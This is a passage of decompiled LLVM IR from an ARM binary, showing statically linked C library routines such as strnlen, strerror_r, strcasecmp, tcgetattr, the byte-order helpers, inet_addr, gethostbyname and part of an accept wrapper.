dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d7c4.dec_label_pc_d7c4_crit_edge, %dec_label_pc_d7c0
  %v2_d7c8 = phi i32 [ %v6_d7c8, %dec_label_pc_d7c4.dec_label_pc_d7c4_crit_edge ], [ %v2_d7c810, %dec_label_pc_d7c0 ]
  %v0_d7c8.off0 = phi i8 [ %extract.t, %dec_label_pc_d7c4.dec_label_pc_d7c4_crit_edge ], [ 0, %dec_label_pc_d7c0 ]
  %v0_d7c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7c4 = add i32 %v0_d7c4, -1
  store i32 %v1_d7c4, i32* %r3.global-to-local, align 4
  %v7_d7c4 = icmp eq i32 %v0_d7c4, 1
  store i1 %v7_d7c4, i1* %cpsr_z.global-to-local, align 1
  %v3_d7c8 = add i32 %v2_d7c8, 1
  %v4_d7c8 = inttoptr i32 %v3_d7c8 to i8*
  store i8 %v0_d7c8.off0, i8* %v4_d7c8, align 1
  %v5_d7c8 = load i32, i32* @ip, align 4
  %v6_d7c8 = add i32 %v5_d7c8, 1
  store i32 %v6_d7c8, i32* @ip, align 4
  %v0_d7cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7cc, label %dec_label_pc_d7d0, label %dec_label_pc_d7c4.dec_label_pc_d7c4_crit_edge

dec_label_pc_d7c4.dec_label_pc_d7c4_crit_edge:    ; preds = %dec_label_pc_d7c4
  %v0_d7c8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_d7c8.pre to i8
  br label %dec_label_pc_d7c4

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d7a8, %dec_label_pc_d7c4, %dec_label_pc_d78c, %dec_label_pc_d7a0
  %v2_d7d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_d7d0, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_d7c8, { 1, 0 }
  uselistorder i32 %v0_d7c4, { 1, 0 }
  uselistorder i32 %v6_d7b0, { 0, 2, 1 }
  uselistorder i32 %v1_d7a0, { 2, 1, 0 }
  uselistorder i32 %v2_d790, { 1, 0 }
  uselistorder i32 %v1_d780, { 1, 0 }
  uselistorder i32 %v0_d77c, { 1, 0 }
  uselistorder i32 %v6_d770, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7d0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_d7a8, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_d7d8 = icmp eq i32 %arg2, 0
  br i1 %v2_d7d8, label %bb, label %dec_label_pc_d7ec

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_d7ec:                                ; preds = %entry
  %v2_d7ec = add i32 %tmp, %arg2
  %v3_d7ec = icmp ult i32 %v2_d7ec, %tmp
  br i1 %v3_d7ec, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_d7ec
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_d7ec, %bb19
  %v5_d88c = phi i32 [ %v2_d7ec, %dec_label_pc_d7ec ], [ -1, %bb19 ]
  %v1_d80c4 = urem i32 %tmp, 4
  %v2_d80c5 = icmp eq i32 %v1_d80c4, 0
  br i1 %v2_d80c5, label %dec_label_pc_d814, label %dec_label_pc_d7fc

dec_label_pc_d7fc:                                ; preds = %bb20, %dec_label_pc_d808
  %v0_d808 = phi i32 [ %v1_d808, %dec_label_pc_d808 ], [ %tmp, %bb20 ]
  %v1_d7fc = inttoptr i32 %v0_d808 to i8*
  %v2_d7fc = load i8, i8* %v1_d7fc, align 1
  %v2_d800 = icmp eq i8 %v2_d7fc, 0
  br i1 %v2_d800, label %dec_label_pc_d888, label %dec_label_pc_d808

dec_label_pc_d808:                                ; preds = %dec_label_pc_d7fc
  %v1_d808 = add i32 %v0_d808, 1
  %v1_d80c = urem i32 %v1_d808, 4
  %v2_d80c = icmp eq i32 %v1_d80c, 0
  br i1 %v2_d80c, label %dec_label_pc_d814, label %dec_label_pc_d7fc

dec_label_pc_d814:                                ; preds = %dec_label_pc_d808, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_d808, %dec_label_pc_d808 ]
  %v3_d87830 = icmp ult i32 %storemerge.lcssa, %v5_d88c
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_d87830, label %dec_label_pc_d81c, label %dec_label_pc_d888

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d874, %dec_label_pc_d814
  %v0_d86c37 = phi i32 [ %v4_d81c, %dec_label_pc_d874 ], [ %storemerge.lcssa, %dec_label_pc_d814 ]
  %v1_d81c = inttoptr i32 %v0_d86c37 to i32*
  %v2_d81c = load i32, i32* %v1_d81c, align 4
  %v4_d81c = add i32 %v0_d86c37, 4
  %v2_d820 = add i32 %v2_d81c, -16843009
  %v2_d824 = and i32 %v2_d820, -2139062144
  store i32 %v2_d824, i32* @ip, align 4
  %v2_d828 = icmp eq i32 %v2_d824, 0
  br i1 %v2_d828, label %dec_label_pc_d874, label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d81c
  %v2_d830 = inttoptr i32 %v0_d86c37 to i8*
  %v3_d830 = load i8, i8* %v2_d830, align 1
  %v2_d834 = icmp eq i8 %v3_d830, 0
  br i1 %v2_d834, label %bb21, label %dec_label_pc_d844

bb21:                                             ; preds = %dec_label_pc_d830
  br label %dec_label_pc_d888

dec_label_pc_d844:                                ; preds = %dec_label_pc_d830
  %v1_d844 = add i32 %v0_d86c37, 1
  %v2_d844 = inttoptr i32 %v1_d844 to i8*
  %v3_d844 = load i8, i8* %v2_d844, align 1
  %v2_d848 = icmp eq i8 %v3_d844, 0
  br i1 %v2_d848, label %dec_label_pc_d888, label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d844
  %v1_d854 = add i32 %v0_d86c37, 2
  %v2_d854 = inttoptr i32 %v1_d854 to i8*
  %v3_d854 = load i8, i8* %v2_d854, align 1
  %v2_d858 = icmp eq i8 %v3_d854, 0
  br i1 %v2_d858, label %dec_label_pc_d888, label %dec_label_pc_d864

dec_label_pc_d864:                                ; preds = %dec_label_pc_d854
  %v1_d864 = add i32 %v0_d86c37, 3
  %v2_d864 = inttoptr i32 %v1_d864 to i8*
  %v3_d864 = load i8, i8* %v2_d864, align 1
  %v2_d868 = icmp eq i8 %v3_d864, 0
  br i1 %v2_d868, label %dec_label_pc_d888, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d864, %dec_label_pc_d81c
  %v3_d878 = icmp ult i32 %v4_d81c, %v5_d88c
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_d878, label %dec_label_pc_d81c, label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d874, %dec_label_pc_d814, %dec_label_pc_d7fc, %dec_label_pc_d844, %dec_label_pc_d854, %dec_label_pc_d864, %bb21
  %v1_d888 = phi i32 [ %v0_d86c37, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_d814 ], [ %v1_d844, %dec_label_pc_d844 ], [ %v1_d854, %dec_label_pc_d854 ], [ %v1_d864, %dec_label_pc_d864 ], [ %v5_d88c, %dec_label_pc_d874 ], [ %v0_d808, %dec_label_pc_d7fc ]
  %v3_d888 = icmp uge i32 %v5_d88c, %v1_d888
  %v9_d888 = icmp eq i32 %v5_d88c, %v1_d888
  %v2_d88c = xor i1 %v3_d888, true
  %v3_d88c = or i1 %v9_d888, %v2_d88c
  br i1 %v3_d88c, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_d888
  %v6_d88c = sub i32 %v5_d88c, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_d888, %bb22
  %v5_d890 = phi i32 [ %v1_d888, %dec_label_pc_d888 ], [ %v6_d88c, %bb22 ]
  %v2_d890 = xor i1 %v9_d888, true
  %v3_d890 = and i1 %v3_d888, %v2_d890
  br i1 %v3_d890, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_d890 = sub i32 %v5_d890, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_d898 = phi i32 [ 0, %bb ], [ %v5_d890, %bb23 ], [ %v6_d890, %bb24 ]
  ret i32 %v1_d898

; uselistorder directives
  uselistorder i1 %v3_d888, { 1, 0 }
  uselistorder i32 %v4_d81c, { 1, 0 }
  uselistorder i32 %v0_d86c37, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_d808, { 1, 0, 2 }
  uselistorder i32 %v5_d88c, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_d888, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_d7fc, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_d8ac = call i32 @__xpg_strerror_r()
  %v0_d8b0 = load i32, i32* @r4, align 4
  ret i32 %v0_d8b0
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_d8bc = load i32, i32* @r4, align 4
  %v9_d8bc = load i32, i32* @r6, align 4
  %v0_d8c4 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  store i32 %v0_d8c4, i32* @ip, align 4
  %v0_d8d4 = load i32, i32* @r1, align 4
  store i32 %v0_d8d4, i32* @r7, align 4
  %v0_d8d8 = load i32, i32* @r2, align 4
  store i32 %v0_d8d8, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_d8c4, 124
  br i1 %tmp, label %dec_label_pc_d910, label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %entry
  br label %dec_label_pc_d8f8

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8f8
  br i1 %v2_d904, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_d8ec
  %v2_d8f0 = add i32 %v1_d908, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d8ec, %bb
  %v0_d8f81 = phi i32 [ %v1_d908, %dec_label_pc_d8ec ], [ %v2_d8f0, %bb ]
  %v1_d8f4 = add i32 %v0_d8f4, 1
  br label %dec_label_pc_d8f8

dec_label_pc_d8f8:                                ; preds = %dec_label_pc_d8e0, %bb15
  %v1_d908 = phi i32 [ %v0_d8c4, %dec_label_pc_d8e0 ], [ %v0_d8f81, %bb15 ]
  %v0_d8f4 = phi i32 [ add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38764), %dec_label_pc_d8e0 ], [ %v1_d8f4, %bb15 ]
  store i32 %v0_d8f4, i32* @r5, align 4
  %v2_d8f8 = icmp eq i32 %v1_d908, 0
  %v1_d8fc = inttoptr i32 %v0_d8f4 to i8*
  %v2_d8fc = load i8, i8* %v1_d8fc, align 1
  %v3_d8fc = zext i8 %v2_d8fc to i32
  store i32 %v3_d8fc, i32* @r3, align 4
  %v2_d904 = icmp eq i8 %v2_d8fc, 0
  br i1 %v2_d8f8, label %dec_label_pc_d904, label %dec_label_pc_d8ec

dec_label_pc_d904:                                ; preds = %dec_label_pc_d8f8
  br i1 %v2_d904, label %dec_label_pc_d910, label %bb16

bb16:                                             ; preds = %dec_label_pc_d904
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d94c

dec_label_pc_d910:                                ; preds = %dec_label_pc_d904, %entry
  store i32 %v0_d8c4, i32* @r2, align 4
  %v3_d918 = ashr i32 %v0_d8c4, 31
  store i32 %v3_d918, i32* @r3, align 4
  %v6_d92c = bitcast i32* %stack_var_-25 to i8*
  %v7_d92c = call i32 @_uintmaxtostr(i8* %v6_d92c)
  %v1_d934 = add i32 %v7_d92c, -14
  store i32 %v1_d934, i32* @r5, align 4
  %v0_d938 = load i32, i32* @r6, align 4
  %v2_d938 = add i32 %v0_d938, -38780
  store i32 %v2_d938, i32* @r1, align 4
  store i32 %v1_d934, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_d944 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_d94c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d94c

dec_label_pc_d94c:                                ; preds = %bb16, %dec_label_pc_d910
  %v0_d94c = phi i32 [ %v0_d8f4, %bb16 ], [ %v0_d94c.pre, %dec_label_pc_d910 ]
  %v1_d94c = inttoptr i32 %v0_d94c to i8*
  %v3_d950 = call i32 @strlen(i8* %v1_d94c)
  %v0_d954 = load i32, i32* @r7, align 4
  %v2_d954 = icmp eq i32 %v0_d954, 0
  br i1 %v2_d954, label %bb17, label %dec_label_pc_d94c._crit_edge

dec_label_pc_d94c._crit_edge:                     ; preds = %dec_label_pc_d94c
  %v1_d960.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_d94c
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_d94c._crit_edge, %bb17
  %v1_d960 = phi i32 [ %v1_d960.pre, %dec_label_pc_d94c._crit_edge ], [ 0, %bb17 ]
  %v1_d95c = add i32 %v3_d950, 1
  %v3_d960 = icmp uge i32 %v1_d95c, %v1_d960
  %v9_d960 = icmp eq i32 %v1_d95c, %v1_d960
  %v2_d964 = xor i1 %v3_d960, true
  %v3_d964 = or i1 %v9_d960, %v2_d964
  br i1 %v3_d964, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_d95c, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_d974 = phi i32 [ %v1_d960, %bb18 ], [ %v1_d95c, %bb19 ]
  %v2_d968 = xor i1 %v9_d960, true
  %v3_d968 = and i1 %v3_d960, %v2_d968
  br i1 %v3_d968, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_d96c = icmp eq i32 %v0_d974, 0
  br i1 %v2_d96c, label %dec_label_pc_d990, label %dec_label_pc_d974

dec_label_pc_d974:                                ; preds = %bb22
  store i32 %v0_d974, i32* @r2, align 4
  %v0_d978 = load i32, i32* @r5, align 4
  store i32 %v0_d978, i32* @r1, align 4
  store i32 %v0_d954, i32* @r0, align 4
  %v0_d980 = call i32 @memcpy()
  %v0_d984 = load i32, i32* @r4, align 4
  %v1_d984 = load i32, i32* @r7, align 4
  %v2_d984 = add i32 %v1_d984, %v0_d984
  %v3_d98c = add i32 %v2_d984, -1
  %v4_d98c = inttoptr i32 %v3_d98c to i8*
  store i8 0, i8* %v4_d98c, align 1
  br label %dec_label_pc_d990

dec_label_pc_d990:                                ; preds = %bb22, %dec_label_pc_d974
  %v0_d990 = load i32, i32* %r6.global-to-local, align 4
  %v2_d990 = icmp eq i32 %v0_d990, 0
  br i1 %v2_d990, label %dec_label_pc_d9a8, label %dec_label_pc_d998

dec_label_pc_d998:                                ; preds = %dec_label_pc_d990
  %v0_d99c = call i32 @__aeabi_read_tp()
  %v3_d9a0 = load i16, i16* @global_var_24070.401, align 2
  %v4_d9a0 = sext i16 %v3_d9a0 to i32
  %v0_d9a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_d9a4 = add i32 %v4_d9a0, %v0_d99c
  %v4_d9a4 = inttoptr i32 %v3_d9a4 to i32*
  store i32 %v0_d9a4, i32* %v4_d9a4, align 4
  %v0_d9a8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9a8

dec_label_pc_d9a8:                                ; preds = %dec_label_pc_d990, %dec_label_pc_d998
  %v0_d9a8 = phi i32 [ 0, %dec_label_pc_d990 ], [ %v0_d9a8.pre, %dec_label_pc_d998 ]
  store i32 %v3_d8bc, i32* @r4, align 4
  store i32 %v9_d8bc, i32* %r6.global-to-local, align 4
  ret i32 %v0_d9a8

; uselistorder directives
  uselistorder i1 %v3_d960, { 1, 0 }
  uselistorder i32 %v0_d8f4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_d908, { 1, 0, 2 }
  uselistorder i32 %v0_d8c4, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_d9a8, { 1, 0 }
  uselistorder label %dec_label_pc_d990, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_d94c, { 1, 0 }
  uselistorder label %dec_label_pc_d8f8, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_d9e4

dec_label_pc_d9e4:                                ; preds = %dec_label_pc_da10, %entry
  %v1_da288 = phi i32 [ %v1_da289, %dec_label_pc_da10 ], [ 0, %entry ]
  %v0_da18 = phi i32 [ %v1_da18, %dec_label_pc_da10 ], [ %arg2, %entry ]
  %v0_da1c = phi i32 [ %v1_da1c, %dec_label_pc_da10 ], [ %tmp, %entry ]
  %v9_d9e4 = icmp eq i32 %v0_da1c, %v0_da18
  %.pre = inttoptr i32 %v0_da1c to i8*
  br i1 %v9_d9e4, label %dec_label_pc_da10, label %dec_label_pc_d9ec

dec_label_pc_d9ec:                                ; preds = %dec_label_pc_d9e4
  %v2_d9ec = load i8, i8* %.pre, align 1
  %v3_d9ec = zext i8 %v2_d9ec to i32
  %v1_d9f0 = inttoptr i32 %v0_da18 to i8*
  %v2_d9f0 = load i8, i8* %v1_d9f0, align 1
  %v3_d9f0 = zext i8 %v2_d9f0 to i32
  %v4_d9f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1792) to i32*), align 4
  %v2_d9f8 = mul nuw nsw i32 %v3_d9f0, 2
  %v2_d9fc = mul nuw nsw i32 %v3_d9ec, 2
  store i32 %v2_d9fc, i32* @r1, align 4
  %v2_da00 = add i32 %v4_d9f4, %v2_d9f8
  %v3_da00 = inttoptr i32 %v2_da00 to i16*
  %v4_da00 = load i16, i16* %v3_da00, align 2
  %v6_da00 = sext i16 %v4_da00 to i32
  %v2_da04 = add i32 %v4_d9f4, %v2_d9fc
  %v3_da04 = inttoptr i32 %v2_da04 to i16*
  %v4_da04 = load i16, i16* %v3_da04, align 2
  %v6_da04 = sext i16 %v4_da04 to i32
  %v2_da08 = sub nsw i32 %v6_da04, %v6_da00
  %v9_da08 = icmp eq i16 %v4_da04, %v4_da00
  br i1 %v9_da08, label %dec_label_pc_da10, label %dec_label_pc_da24

dec_label_pc_da10:                                ; preds = %dec_label_pc_d9e4, %dec_label_pc_d9ec
  %v1_da289 = phi i32 [ %v2_da08, %dec_label_pc_d9ec ], [ %v1_da288, %dec_label_pc_d9e4 ]
  %v2_da10 = load i8, i8* %.pre, align 1
  %v2_da14 = icmp eq i8 %v2_da10, 0
  %v1_da18 = add i32 %v0_da18, 1
  %v1_da1c = add i32 %v0_da1c, 1
  store i32 %v1_da1c, i32* @ip, align 4
  br i1 %v2_da14, label %dec_label_pc_da24, label %dec_label_pc_d9e4

dec_label_pc_da24:                                ; preds = %dec_label_pc_da10, %dec_label_pc_d9ec
  %v1_da28 = phi i32 [ %v1_da289, %dec_label_pc_da10 ], [ %v2_da08, %dec_label_pc_d9ec ]
  ret i32 %v1_da28

; uselistorder directives
  uselistorder i32 %v1_da1c, { 1, 0 }
  uselistorder i32 %v2_da08, { 1, 0 }
  uselistorder i32 %v2_d9fc, { 1, 0 }
  uselistorder i32 %v0_da1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_da10, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11116), i32* @r2, align 4
  %v0_da4c = call i32 @strtok_r()
  ret i32 %v0_da4c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_da6c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_da6c, i32* @r1, align 4
  %v0_da70 = call i32 @__GI_tcgetattr()
  %v1_da74 = sub i32 1, %v0_da70
  %v2_da74 = icmp ult i32 %v0_da70, 2
  br i1 %v2_da74, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_da84 = phi i32 [ %v1_da74, %entry ], [ 0, %bb ]
  ret i32 %v1_da84

; uselistorder directives
  uselistorder i32 %v0_da70, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_da88 = load i32, i32* @r4, align 4
  %v6_da88 = load i32, i32* @r5, align 4
  %v9_da88 = load i32, i32* @r6, align 4
  %v2_da90 = ptrtoint i32* %stack_var_-52 to i32
  %v0_da94 = load i32, i32* @r1, align 4
  store i32 %v0_da94, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_daa0 = load i32, i32* @r0, align 4
  %v3_daa0 = call i32 @ioctl(i32 %v0_daa0, i32 21505, i32 %v2_da90)
  store i32 %v3_daa0, i32* %r0.global-to-local, align 4
  store i32 %v3_daa0, i32* @r5, align 4
  %v2_daa4 = icmp eq i32 %v3_daa0, 0
  br i1 %v2_daa4, label %dec_label_pc_daac, label %dec_label_pc_daf0

dec_label_pc_daac:                                ; preds = %entry
  %v4_dab8 = zext i8 %tmp to i32
  store i32 %v4_dab8, i32* @ip, align 4
  %v3_dabc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_dabc, i32* @r3, align 4
  %v1_dac0 = load i32, i32* @r4, align 4
  %v2_dac0 = add i32 %v1_dac0, 4
  %v3_dac0 = inttoptr i32 %v2_dac0 to i32*
  %v0_dac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dac4 = load i32, i32* @r4, align 4
  %v2_dac4 = add i32 %v1_dac4, 8
  %v3_dac4 = inttoptr i32 %v2_dac4 to i32*
  store i32 %v0_dac4, i32* %v3_dac4, align 4
  %v0_dac8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dac8 = load i32, i32* @r4, align 4
  %v2_dac8 = add i32 %v1_dac8, 12
  %v3_dac8 = inttoptr i32 %v2_dac8 to i32*
  store i32 %v0_dac8, i32* %v3_dac8, align 4
  %v2_dacc = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_dacc, i32* @r1, align 4
  %v1_dad4 = load i32, i32* @r4, align 4
  %v2_dad4 = inttoptr i32 %v1_dad4 to i32*
  store i32 %v3_dabc, i32* %v2_dad4, align 4
  %v0_dad8 = load i32, i32* @ip, align 4
  %v1_dad8 = trunc i32 %v0_dad8 to i8
  %v2_dad8 = load i32, i32* @r4, align 4
  %v3_dad8 = add i32 %v2_dad8, 16
  %v4_dad8 = inttoptr i32 %v3_dad8 to i8*
  store i8 %v1_dad8, i8* %v4_dad8, align 1
  %v0_dadc = load i32, i32* @r4, align 4
  %v1_dadc = add i32 %v0_dadc, 17
  store i32 %v1_dadc, i32* %r0.global-to-local, align 4
  %v4_dae0 = call i32 @__GI_mempcpy(i32 %v1_dadc, i32 %v2_dacc, i32 19, i32 %v3_dabc)
  store i32 %v4_dae0, i32* %r0.global-to-local, align 4
  %v0_dae4 = load i32, i32* @r5, align 4
  store i32 %v0_dae4, i32* %r1.global-to-local, align 4
  %v3_daec = inttoptr i32 %v4_dae0 to i8*
  %v4_daec = call i32 @__GI_memset(i8* %v3_daec, i32 %v0_dae4, i32 13)
  store i32 %v4_daec, i32* %r0.global-to-local, align 4
  %v0_daf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %entry, %dec_label_pc_daac
  %v0_daf0 = phi i32 [ %v3_daa0, %entry ], [ %v0_daf0.pre, %dec_label_pc_daac ]
  store i32 %v0_daf0, i32* %r0.global-to-local, align 4
  store i32 %v3_da88, i32* @r4, align 4
  store i32 %v6_da88, i32* @r5, align 4
  store i32 %v9_da88, i32* @r6, align 4
  ret i32 %v0_daf0

; uselistorder directives
  uselistorder i32 %v0_daf0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_daf0, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_db04 = udiv i32 %arg1, 256
  %v1_db08 = mul i32 %arg1, 256
  %v4_db0c = and i32 %v1_db08, 65280
  %v5_db0c = or i32 %v4_db0c, %v3_db04
  ret i32 %v5_db0c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_db2c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_db2c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_db34 = udiv i32 %arg1, 256
  %v1_db38 = mul i32 %arg1, 256
  %v4_db3c = and i32 %v1_db38, 65280
  %v5_db3c = or i32 %v4_db3c, %v3_db34
  ret i32 %v5_db3c
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_db5c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_db5c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_db6c = ptrtoint i32* %stack_var_-12 to i32
  %v0_db70 = load i32, i32* @r0, align 4
  %v2_db70 = inttoptr i32 %v0_db70 to i8*
  %v3_db70 = call i32 @inet_aton(i8* %v2_db70, i32 %v2_db6c)
  %v2_db74 = icmp eq i32 %v3_db70, 0
  %v4_db78 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_db74, i32 -1, i32 %v4_db78
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_db98 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_db98
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v3_dba8 = load i32, i32* @r4, align 4
  %v0_dbc4 = load i32, i32* @r0, align 4
  %v3_dbc8 = load i32, i32* @global_var_2402c.512, align 4
  %v0_dbcc = call i32 @__aeabi_read_tp()
  %v2_dbd4 = add i32 %v3_dbc8, %v0_dbcc
  store i32 %v2_dbd4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11120), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11560), i32* @r2, align 4
  %v1_dbf4 = call i32 @gethostbyname2_r(i32 %v0_dbc4)
  store i32 %v3_dba8, i32* @r4, align 4
  ret i32 %tmp4
}

define i32 @function_dc10(i32 %arg1) local_unnamed_addr {
dec_label_pc_dc10:
  %v0_dc10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dc10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dc10
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dc10, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dc18 = load i32, i32* @r7, align 4
  store i32 %v3_dc18, i32* %stack_var_-8, align 4
  %v0_dc24 = load i32, i32* @r0, align 4
  store i32 %v0_dc24, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_dc24, -4095
  br i1 %tmp, label %dec_label_pc_dc4c, label %dec_label_pc_dc34

dec_label_pc_dc34:                                ; preds = %entry
  %v0_dc38 = call i32 @__aeabi_read_tp()
  %v3_dc3c = load i16, i16* @global_var_24070.401, align 2
  %v4_dc3c = sext i16 %v3_dc3c to i32
  %v0_dc40 = load i32, i32* %r2.global-to-local, align 4
  %v1_dc40 = sub i32 0, %v0_dc40
  store i32 %v1_dc40, i32* %r2.global-to-local, align 4
  %v3_dc44 = add i32 %v4_dc3c, %v0_dc38
